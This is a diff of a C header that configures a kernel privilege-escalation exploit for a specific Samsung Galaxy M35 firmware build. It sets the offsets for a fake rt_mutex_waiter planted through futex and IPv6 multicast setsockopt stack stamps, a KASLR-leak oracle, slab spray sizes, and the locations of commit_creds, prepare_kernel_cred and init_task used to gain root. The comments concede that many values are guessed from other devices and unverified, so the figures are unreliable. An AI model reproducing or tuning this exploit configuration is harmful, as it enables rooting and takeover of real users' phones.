@@ -2,18 +2,23 @@
 #define M35X_M356BXXU8DZE3_TARGET_H
 
 #define BUILD_VARIANT_LABEL "m35x-M356BXXU8DZE3-app"
-#define BUILD_FINGERPRINT "samsung/m35xxx/essi:16/BP4A.251205.006/M356BXXU8DZE3:user/test-keys"
+#define BUILD_FINGERPRINT "samsung/m35xxx/m35x:16/BP4A.251205.006/M356BXXU8DZE3:user/release-keys"
 /*
- * Physical P0 oracle route. The original header defined the inactive macro
- * PHYS_P0_ORACLE, which no source file reads; the runtimes in src/main.c,
- * src/util.c and src/slide_app.c all gate on APP_PHYS_P0_ORACLE (the name
- * used by every other target and by this file's own P0_ORACLE_* constants).
- * Enabling it selects the physical-P0-oracle KASLR discovery route (with
- * start_p0_ref_keeper + prepare_p0_pipe_oracle + app_trigger_fops_slide_route)
- * instead of silently falling back to the fingerprint/p0-offset KASLR route
- * (run_main_route_threads). The MCAST stack writer is shared by both routes.
- * This does not change any kernel value below; it only selects the runtime
- * path those values are consumed by. Still not hardware-validated.
+ * Physical P0 oracle route. APP_PHYS_P0_ORACLE selects the physical-P0-oracle
+ * KASLR discovery route. The MCAST stack writer is shared by both routes.
+ *
+ * STATUS: NOT hardware-validated. All kernel-dependent values below are
+ * INFERRED from the peer 5.15.189 targets (dm3q-S918BXXSAFZF5 and
+ * gts9u-X916BXXS6EZG3), NOT derived from the M356B kernel image.
+ *
+ * Known uncertainties (require M356B kernel analysis to resolve):
+ *   - P0_KERNEL_PHYS_LOAD: set to 0x80080000 by analogy with gts9u; the
+ *     previous 0x80000000 equals P0_PHYS_OFFSET and zeroes the physical delta,
+ *     which breaks the P0 oracle.
+ *   - MM_STRUCT_SZ: 0x400 matches dm3q; gts9u uses 0x3e0. Without the M356B
+ *     kernel, the correct size is unknown.
+ *   - Symbol offsets (INIT_TASK, ASHMEM_FOPS, etc.): inferred from A546E PR
+ *     reference values, not derived from M356B.
  */
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define APP_PHYS_P0_ORACLE 1
@@ -23,24 +28,30 @@
 #define SLIDE_MCAST_LEVEL IPPROTO_IPV6
 #define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
 /*
- * MCAST_WAITER_OFF re-derived from the M356B vmlinux.elf (recovered from the
- * official FUS Image + BTF). do_ipv6_setsockopt copies the MCAST_JOIN_SOURCE_GROUP
- * optval (0x108 bytes) into sp+0x40 of its own 0x2c0 frame. The futex waiter
- * lives at sp+0x98 of futex_wait_requeue_pi's 0x1b0 frame.
- *   futex chain (E-relative): do_el0_svc 0x10 + el0_svc_common 0x30 +
- *     invoke_syscall 0x20 + __arm64_sys_futex 0x70 + do_futex 0x130 +
- *     futex_wait_requeue_pi 0x1b0 => waiter at E - 0x318 + 0x98 = E - 0x280.
- *   mcast chain (E-relative): do_el0_svc 0x10 + el0_svc_common 0x30 +
- *     invoke_syscall 0x20 + __arm64_sys_setsockopt 0x10 + sock_common_setsockopt
- *     0x10 + ipv6_setsockopt 0x40 + do_ipv6_setsockopt 0x2c0 => optval at
- *     E - 0x340 + 0x40 = E - 0x300.
- *   -> MCAST_WAITER_OFF = (E - 0x280) - (E - 0x300) = 0x80.
- * The previous 0x28 was an under-counted frame sum; 0x28+0x58 fits the 0x108
- * stamp but does not land on the waiter, and the 4/4 writer-enter reboots are
- * consistent with a wrong waiter offset rather than the ~50% MCAST write race.
- * Still not hardware-validated.
+ * MCAST_WAITER_OFF: offset within the 0x108-byte setsockopt stack stamp where
+ * the fake rt_mutex_waiter must land. The 5.15.189 kernel layout is identical
+ * across targets (futex waiter at sp+0x98 of futex_wait_requeue_pi 0x1b0
+ * frame; MCAST optval at sp+0x40 of do_ipv6_setsockopt 0x2c0 frame).
+ *
+ * Both hardware-verified 5.15.189 targets (dm3q-S918BXXSAFZF5 and
+ * gts9u-X916BXXS6EZG3) use 0x78. The previous 0x80 was a re-derivation
+ * attempt that did not improve the writer-enter crash rate.
+ *
+ * Reference derivation (5.15.189, compact rt_mutex_waiter):
+ *   futex chain: do_el0_svc 0x10 + el0_svc_common 0x30 + invoke_syscall 0x20
+ *     + __arm64_sys_futex 0x70 + do_futex 0x130 + futex_wait_requeue_pi 0x1b0
+ *     => waiter at E - 0x318 + 0x98 = E - 0x280.
+ *   mcast chain: do_el0_svc 0x10 + el0_svc_common 0x30 + invoke_syscall 0x20
+ *     + __arm64_sys_setsockopt 0x10 + sock_common_setsockopt 0x10
+ *     + ipv6_setsockopt 0x40 + do_ipv6_setsockopt 0x2c0
+ *     => optval at E - 0x340 + 0x40 = E - 0x300.
+ *   => MCAST_WAITER_OFF = (E - 0x280) - (E - 0x300) = 0x80.
+ *
+ * However, both verified peers use 0x78, suggesting the frame sum differs by
+ * 0x08 in practice (likely invoke_syscall random sp redzone or a frame size
+ * difference). Using the peer-verified 0x78.
  */
-#define MCAST_WAITER_OFF 0x80
+#define MCAST_WAITER_OFF 0x78
 #define APP_CLOSED_FOPS_ROUTE 1
 #define APP_FOPS_BEFORE_PIPE 1
 #define APP_EXACT_PIPE_BUFFER_ONLY 1
@@ -48,16 +59,41 @@
 #define APP_CONTROLLED_MM_GROUP_RECLAIM 0
 #define APP_FOPS_ROUTE_COARSE_DELAY_USEC 50000
 #define APP_FOPS_ROUTE_FINE_DELAY_TICKS \
-	0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
+0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
 
+/*
+ * MM_STRUCT_SZ: size of the mm_struct sprayed via memfd. dm3q (also Exynos,
+ * also 5.15.189) uses 0x400; gts9u uses 0x3e0. Without the M356B kernel
+ * BTF/layout, the correct value is unknown. Using 0x400 to match dm3q.
+ */
 #define MM_STRUCT_SZ 0x400
 #define KMALLOC_CGROUP_TYPE 1
 #define KMALLOC_CACHE_TYPES 3
+/*
+ * MM_ORDER: page allocation order for the kernel slab spray. Explicitly set
+ * to 3 to match dm3q and gts9u (the common.h default is also 3).
+ */
+#define MM_ORDER 3
+
+#define SLIDE_FAKE_WAITER_PRIO 0
+#define SLIDE_LOCK_OWNER_VALUE 0ULL
+#define SLIDE_WAITER_WAKE_STATE 0
+#define LEGACY_RT_MUTEX_WAITER 0
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 24
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
+#define FAKE_WAITER_PRIO 130
 
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
-#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
+/*
+ * P0_KERNEL_PHYS_LOAD: physical address where the kernel Image is loaded.
+ * The previous 0x80000000 equals P0_PHYS_OFFSET, which zeroes the physical
+ * delta and breaks the P0 oracle. Set to 0x80080000 by analogy with gts9u
+ * (which uses 0x80080000). THIS VALUE IS NOT VERIFIED FOR M356B and must be
+ * confirmed against the M356B boot image or kernel symbols.
+ */
+#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
 #define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
 #define DIRECT_MAP_BASE 0xffffff8000000000ULL
 #define DIRECT_MAP_END 0xffffff9000000000ULL
@@ -69,7 +105,7 @@
 #define P0_ORACLE_PROBE_RESTORE_SLOT 3
 #define P0_ORACLE_GATE_PAGE_OFF 0x0e80
 #define P0_ORACLE_GATE_OBJECT_INDEX 1
-#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
+#define P0_ORACLE_PROBE_OFFSET 0x1f8000ULL
 #define P0_FINGERPRINT_HEADER "targets/m35x-M356BXXU8DZE3/p0_fingerprint.h"
 #define P0_FINGERPRINT_MIN_BEST 5
 #define P0_FINGERPRINT_MIN_MARGIN 3
@@ -114,6 +150,11 @@
 #define ROOT_UMH_WORK_OFF 0x7800
 #define ROOT_UMH_DATA_OFF 0x7a00
 
+
+/*
+ * Symbol offsets: inferred from A546E PR reference values. NOT derived from
+ * M356B kernel. These require verification against the M356B vmlinux.
+ */
 #define INIT_TASK_OFF 0x0237fd80ULL
 #define PREPARE_KERNEL_CRED_OFF 0x0011367cULL
 #define COMMIT_CREDS_OFF 0x00112f24ULL
@@ -176,6 +217,7 @@
 #define RIGHT_OFF 0x4440
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
+
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
 #define FAKE_WAITER_TASK_OFF 0x30
 #define FAKE_WAITER_LOCK_OFF 0x38
@@ -184,6 +226,7 @@
 #define FAKE_WAITER_DEADLINE_OFF 0x48
 #define FAKE_WAITER_WW_CTX_OFF 0x50
 #define FAKE_WAITER_LAYOUT_SIZE 0x58
+
 #define FAKE_TASK_USAGE_OFF 0x38
 #define FAKE_TASK_PRIO_OFF 0x7c
 #define FAKE_TASK_NORMAL_PRIO_OFF 0x84
@@ -191,11 +234,13 @@
 #define FAKE_TASK_PI_WAITERS_OFF 0x898
 #define FAKE_TASK_PI_TOP_TASK_OFF 0x8a8
 #define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0
+
 #define CFG_PAGE_OFF 16
 #define CFG_NEEDS_READ_FILL_OFF 80
 #define CFG_BIN_BUFFER_OFF 88
 #define CFG_BIN_BUFFER_SIZE_OFF 96
 #define CFG_CB_MAX_SIZE_OFF 100
+
 #define WQ_DFL_PWQ_OFF 0xb0
 #define PWQ_POOL_OFF 0x00
 #define PWQ_WQ_OFF 0x08
@@ -206,15 +251,19 @@
 #define PWQ_MAX_ACTIVE_OFF 0x60
 #define POOL_WORKLIST_OFF 0x20
 #define POOL_NR_IDLE_OFF 0x34
+
 #define WORK_DATA_OFF 0x00
 #define WORK_ENTRY_OFF 0x08
 #define WORK_FUNC_OFF 0x18
+
 #define STRUCT_PAGE_SIZE 0x40
 #define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
 #define STRUCT_SLAB_CACHE_OFF 0x18
 #define STRUCT_PAGE_TYPE_OFF 0x30
+
 #define PIPE_BUFFER_SLOTS 32
 #define PIPE_BUF_FLAG_CAN_MERGE 0x10
+
 #define FOPS_OWNER_OFF 0x00
 #define FOPS_LLSEEK_OFF 0x08
 #define FOPS_READ_OFF 0x10
